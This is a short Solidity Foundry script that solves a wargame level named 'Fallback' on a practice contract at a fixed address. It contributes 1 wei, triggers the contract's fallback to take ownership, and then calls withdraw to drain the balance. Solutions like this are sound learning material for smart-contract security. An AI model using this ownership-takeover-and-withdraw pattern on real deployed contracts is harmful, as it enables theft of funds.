// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Fallback} from "../src/level1Fallback.sol";
import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

contract Level1Solution is Script {
    Fallback public fallbackContract =
        Fallback(payable(0x2e0B010deA3d4FDB129D4A0C66F238Bd5626eC59));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackContract.contribute{value: 1 wei}();
        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Call to fallback failed");

        if (fallbackContract.owner() == vm.envAddress("MY_ADDRESS")) {
            console.log("you are now the OWNER !!");
            fallbackContract.withdraw();
        } else {
            console.log("you are not the OWNER :(");
        }
        vm.stopBroadcast();
    }
}
